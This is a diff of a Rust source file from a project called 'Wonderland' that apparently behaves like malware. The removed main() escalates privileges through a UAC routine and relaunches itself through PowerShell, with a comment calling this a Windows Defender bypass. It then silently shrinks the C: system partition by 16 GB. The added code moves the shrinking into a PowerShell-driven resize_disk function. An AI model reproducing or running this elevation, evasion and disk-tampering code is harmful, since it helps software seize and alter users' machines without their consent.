@@ -17,33 +17,31 @@
  * along with Wonderland.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-mod uac;
-mod diskutils;
-
+use std::process::Command;
 use std::io;
-use std::process::{Command, exit};
-use std::env::{args, current_exe};
 
-use is_elevated::is_elevated;
-
-fn main() -> io::Result<()>
+pub fn resize_disk(letter: &str, part_size: usize) -> io::Result<()>
 {
-    if !is_elevated()
+    let output_size = Command::new("powershell")
+                            .args(&["-command", "(", "Get-Partition", "-DriveLetter", letter, ").size"])
+                            .output()?;
+
+    let mut size_str: String = String::from_utf8(output_size.stdout).unwrap();
+    size_str.retain(|c| !c.is_whitespace());
+
+    let size: f64;
+
+    match size_str.parse::<f64>()
     {
-        uac::uac()?;
-        exit(0);
+        Ok(raw_size) => size = raw_size / 1073741824.0,
+        Err(_) => panic!()
     }
 
-    if args().collect::<Vec<String>>().len() == 1
-    {
-        /* A little window defender bypass stupid isn't it ? */
-        Command::new("powershell")
-                .args(&["-command", current_exe()?.to_str().unwrap(), "white_rabbit"])
-                .spawn()?;
-    }
+    let shrink_size: usize = size.floor() as usize - part_size;
 
-    diskutils::resize_disk("C", 16)?;
-
+    Command::new("powershell")
+            .args(&["-command", "Resize-Partition", "-DriveLetter", letter, "-Size", format!("({}GB)", shrink_size).as_str()])
+            .spawn()?;
 
     Ok(())
 }
